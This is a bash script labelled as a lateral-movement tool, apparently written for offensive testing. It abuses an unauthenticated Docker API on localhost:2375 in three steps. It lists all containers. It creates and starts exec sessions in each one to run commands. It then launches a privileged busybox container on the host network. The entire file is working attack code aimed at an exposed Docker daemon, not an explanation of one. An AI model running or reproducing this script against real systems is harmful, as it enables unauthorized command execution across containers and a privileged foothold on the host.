#!/bin/bash
# Lateral Movement Script
# Attempts to access other containers/pods

echo "=== Lateral Movement Attempts ==="
echo ""

echo "[*] Listing all containers for lateral movement..."
CONTAINERS=$(curl -s http://localhost:2375/containers/json | python3 -c "import sys, json; [print(c['Id']) for c in json.load(sys.stdin)]" 2>/dev/null)

if [ -z "$CONTAINERS" ]; then
    echo "[-] No containers found or cannot access Docker API"
    exit 1
fi

echo "[+] Found containers. Attempting to exec into each..."
echo ""

for CONTAINER in $CONTAINERS; do
    echo "[*] Trying container: ${CONTAINER:0:12}..."
    
    # Try to create exec
    EXEC_RESPONSE=$(curl -s -X POST -H "Content-Type: application/json" \
      http://localhost:2375/containers/$CONTAINER/exec \
      -d '{"Cmd":["id"],"AttachStdout":true,"AttachStderr":true}' 2>/dev/null)
    
    EXEC_ID=$(echo $EXEC_RESPONSE | python3 -c "import sys, json; print(json.load(sys.stdin).get('Id', ''))" 2>/dev/null)
    
    if [ ! -z "$EXEC_ID" ]; then
        echo "  [+] Exec created: ${EXEC_ID:0:12}"
        
        # Try to start exec
        EXEC_OUTPUT=$(curl -s -X POST -H "Content-Type: application/json" \
          http://localhost:2375/exec/$EXEC_ID/start \
          -d '{"Detach":false}' 2>/dev/null)
        
        # Clean output (remove Docker stream headers)
        CLEAN_OUTPUT=$(echo -n "$EXEC_OUTPUT" | tail -c +9 2>/dev/null | strings)
        if [ ! -z "$CLEAN_OUTPUT" ]; then
            echo "  [+] Output: $CLEAN_OUTPUT"
        fi
    else
        echo "  [-] Cannot create exec (container may not be running)"
    fi
    echo ""
done

echo "[*] Attempting to create new container with host network..."
HOST_NET_CONTAINER=$(curl -s -X POST -H "Content-Type: application/json" \
  http://localhost:2375/containers/create \
  -d '{
    "Image": "busybox:1",
    "Cmd": ["sleep", "3600"],
    "HostConfig": {
      "NetworkMode": "host",
      "Privileged": true
    }
  }' 2>/dev/null | python3 -c "import sys, json; print(json.load(sys.stdin).get('Id', ''))" 2>/dev/null)

if [ ! -z "$HOST_NET_CONTAINER" ]; then
    echo "[+] Created host network container: ${HOST_NET_CONTAINER:0:12}"
    curl -s -X POST http://localhost:2375/containers/$HOST_NET_CONTAINER/start >/dev/null 2>&1
    echo "[+] Container started"
else
    echo "[-] Failed to create host network container"
fi
echo ""
